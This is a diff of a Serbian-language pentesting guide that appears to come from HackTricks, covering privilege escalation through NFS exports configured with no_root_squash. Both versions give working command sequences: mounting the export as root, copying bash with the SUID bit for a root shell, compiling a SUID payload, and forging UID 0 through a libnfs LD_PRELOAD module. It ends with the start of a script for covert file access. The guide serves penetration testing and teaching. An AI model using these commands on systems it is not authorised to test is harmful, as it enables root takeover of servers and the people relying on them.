@@ -1,16 +1,18 @@
 # NFS No Root Squash Misconfiguration Privilege Escalation
 
-## Osnovne informacije o squashing-u
+{{#include ../../banners/hacktricks-training.md}}
 
-Kod NFS AUTH_SYS/AUTH_UNIX, server zasniva provere dozvola za fajlove na `uid` i `gid` vrednostima poslatim u svakom RPC zahtevu. Drugi security flavor-i, kao što je Kerberos, koriste drugačije credentials, a server može mapirati numeričke credentials pre provere dozvola.<sup>[[4]](#references)[[5]](#references)</sup>
+## Osnovne informacije o Squashing-u
 
-- **`all_squash`**: Mapira svaki UID i GID na anonymous account, koji je na Linux-u podrazumevano `nobody` (65534). `no_all_squash` je podrazumevana vrednost za zahteve koji ne dolaze od root-a.<sup>[[4]](#references)</sup>
-- **`root_squash`**: Ovo je podrazumevana vrednost na Linux-u i mapira zahteve sa UID/GID 0 (root) na anonymous account; ostali UID-ovi i GID-ovi se ne squash-uju.<sup>[[4]](#references)</sup>
+Sa NFS AUTH_SYS/AUTH_UNIX, server zasniva provere dozvola za fajlove na `uid` i `gid` vrednostima dostavljenim u svakom RPC zahtevu. Drugi security flavors, kao što je Kerberos, koriste drugačije kredencijale, a server može mapirati numeričke kredencijale pre provere dozvola.<sup>[[4]](#references)[[5]](#references)</sup>
+
+- **`all_squash`**: Mapira svaki UID i GID na anonimni nalog, koji je na Linux-u podrazumevano `nobody` (65534). `no_all_squash` je podrazumevana vrednost za zahteve koji nisu root.<sup>[[4]](#references)</sup>
+- **`root_squash`**: Ovo je podrazumevana vrednost na Linux-u i mapira zahteve sa UID/GID 0 (root) na anonimni nalog; ostali UID-ovi i GID-ovi se ne squash-uju.<sup>[[4]](#references)</sup>
 - **`no_root_squash`**: Onemogućava root squashing, tako da zahtevi sa UID/GID 0 mogu biti obrađeni kao root na serveru.<sup>[[4]](#references)</sup>
 
-Ako klijent kome je dozvoljen pristup može da mount-uje writable export u **`/etc/exports`** koji je konfigurisan sa **`no_root_squash`**, njegovi UID/GID 0 zahtevi mogu da upisuju podatke kao root user servera.<sup>[[4]](#references)</sup>
+Ako klijent kome je dozvoljen pristup može da mount-uje export sa dozvolom upisa u **`/etc/exports`**, konfigurisan sa **`no_root_squash`**, njegovi UID/GID 0 zahtevi mogu tamo da upisuju podatke kao root korisnik servera.<sup>[[4]](#references)</sup>
 
-Za više informacija o **NFS-u** pogledajte:
+Za više informacija o **NFS** pogledajte:
 
 {{#ref}}
 ../../network-services-pentesting/nfs-service-pentesting.md
@@ -20,9 +22,9 @@ Za više informacija o **NFS-u** pogledajte:
 
 ### Remote Exploit
 
-Option 1 using bash:
-- Na klijentu kome je dozvoljen pristup, mount-ujte writable export kao root, kopirajte **`/bin/bash`** u njega, postavite njegov **SUID** bit i izvršite ga iz victim mount-a koji ne koristi `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
-- Da bi upload-ovani fajl ostao u vlasništvu root-a, server mora da koristi **`no_root_squash`**. Ako se root squash-uje, SUID binary za drugi account je moguć samo kada klijent može legitimno da ga kreira ili bude njegov vlasnik sa numeričkim UID/GID-om tog account-a.<sup>[[4]](#references)</sup>
+Opcija 1 pomoću bash-a:
+- Na klijentu kome je dozvoljen pristup, mount-ujte export sa dozvolom upisa kao root, kopirajte **`/bin/bash`** u njega, postavite njegov **SUID** bit i izvršite ga iz victim mount-a koji ne koristi `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
+- Da bi upload-ovani fajl ostao u vlasništvu root-a, server mora da koristi **`no_root_squash`**. Ako se root squash-uje, SUID binarni fajl za drugi nalog moguć je samo kada klijent može legitimno da ga kreira ili bude njegov vlasnik sa numeričkim UID/GID tog naloga.<sup>[[4]](#references)</sup>
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -35,9 +37,9 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-Opcija 2 korišćenjem kompajliranog C koda:
-- Montirajte direktorijum sa dozvoljenog klijenta, kopirajte kompajlirani payload koji zloupotrebljava SUID dozvole, postavite njegov **SUID** bit i izvršite ga sa žrtve (pogledajte neke [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
-- Ista ograničenja kao i ranije
+Opcija 2 pomoću kompajliranog C koda:
+- Montirajte direktorijum sa dozvoljenog klijenta, kopirajte kompajlirani payload koji zloupotrebljava **SUID** dozvole, postavite njegov **SUID** bit i izvršite ga sa žrtve (pogledajte neke [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
+- Ista ograničenja kao ranije
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -54,26 +56,26 @@ cd <SHAREDD_FOLDER>
 ### Local Exploit
 
 > [!TIP]
-> Imajte na umu da, ako možete da kreirate **tunnel sa vaše mašine do victim mašine, i dalje možete da koristite Remote verziju za exploit ove privilege escalation tehnike, tunelovanjem potrebnih portova**.\
-> Sledeći trik je koristan kada `/etc/exports` ograničava export na IP adresu victim mašine: remote client ne može da ga mount-uje, ali local tehnika može da radi kroz share koji je već mount-ovan na dozvoljenom hostu.<sup>[[2]](#references)</sup>\
-> Za ovaj neprivilegovani libnfs metod, export u **`/etc/exports`** mora da koristi `insecure` flag kako bi proces mogao da koristi non-reserved source port; `secure` je podrazumevana vrednost, iako procesu koji može da bind-uje reserved port ova opcija nije potrebna.<sup>[[1]](#references)[[4]](#references)</sup>
+> Imajte na umu da, ako možete da kreirate **tunnel sa svoje mašine do mašine žrtve, i dalje možete koristiti Remote verziju za iskorišćavanje ove privilege escalation ranjivosti tunelovanjem potrebnih portova**.\
+> Sledeći trik je koristan kada `/etc/exports` ograničava export na IP adresu žrtve: remote client ne može da ga mountuje, ali lokalna tehnika može da radi preko share-a koji je već mountovan na dozvoljenom hostu.<sup>[[2]](#references)</sup>\
+> Za ovaj neprivilegovani libnfs metod, export u **`/etc/exports`** mora da koristi `insecure` flag kako bi proces mogao da koristi non-reserved source port; `secure` je podrazumevana vrednost, iako procesu koji može da binduje reserved port ova opcija nije potrebna.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ### Osnovne informacije
 
-NFSv3 AUTH_UNIX client uključuje svoj effective UID, GID i grupe u svaki poziv, a server ih koristi za proveru dozvola. Ova local tehnika zloupotrebljava taj model falsifikovanjem RPC credentials kroz [libnfs](https://github.com/sahlberg/libnfs); njegov preload modul podržava override UID/GID vrednosti u NFS context-u.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
+NFSv3 AUTH_UNIX client uključuje svoj effective UID, GID i grupe u svakom pozivu, a server ih koristi za proveru dozvola. Ova lokalna tehnika zloupotrebljava taj model falsifikovanjem RPC credentials kroz [libnfs](https://github.com/sahlberg/libnfs); njegov preload module podržava override UID/GID vrednosti u NFS context-u.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
 
 #### Kompajliranje biblioteke
 
-libnfs primer može zahtevati prilagođavanja za target kernel; ovde korišćeni walkthrough posebno navodi da pre kompajliranja preload modula treba zakomentarisati fallocate syscalls.<sup>[[1]](#references)[[2]](#references)</sup>
+libnfs primer može zahtevati prilagođavanja za ciljni kernel; ovde korišćeni walkthrough posebno navodi da pre kompajliranja preload module-a treba zakomentarisati fallocate syscalls.<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
-#### Sprovođenje Exploit-a
+#### Izvođenje Exploit-a
 
-Primer kreira mali C helper koji pokreće shell, zatim ga postavlja na share i koristi `ld_nfs.so` sa UID 0 u NFS kontekstu kako bi ga učinio SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>
+Primer kreira mali C pomoćni program koji pokreće shell, zatim ga postavlja na share i koristi `ld_nfs.so` sa UID 0 u NFS kontekstu kako bi ga učinio SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>
 
 1. **Kompajlirajte exploit kod:**
 ```bash
@@ -88,14 +90,14 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-3. **Izvršite exploit da biste stekli root privilegije**.<sup>[[2]](#references)</sup>
+3. **Izvršite exploit da biste dobili root privilegije**.<sup>[[2]](#references)</sup>
 ```bash
 /mnt/share/a.out
 #root
 ```
-### Bonus: NFShell za neupadljiv pristup datotekama
+### Bonus: NFShell za prikriveni pristup datotekama
 
-Nakon dobijanja root pristupa, ovaj obrazac `nfsh.py` postavlja effective UID na UID ciljne datoteke pre pokretanja komande, čime omogućava pristup bez rekurzivne promene vlasništva.<sup>[[2]](#references)</sup>
+Kada se dobije root pristup, ovaj obrazac `nfsh.py` postavlja efektivni UID na UID ciljne datoteke pre pokretanja komande, čime omogućava pristup bez rekurzivne promene vlasništva.<sup>[[2]](#references)</sup>
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
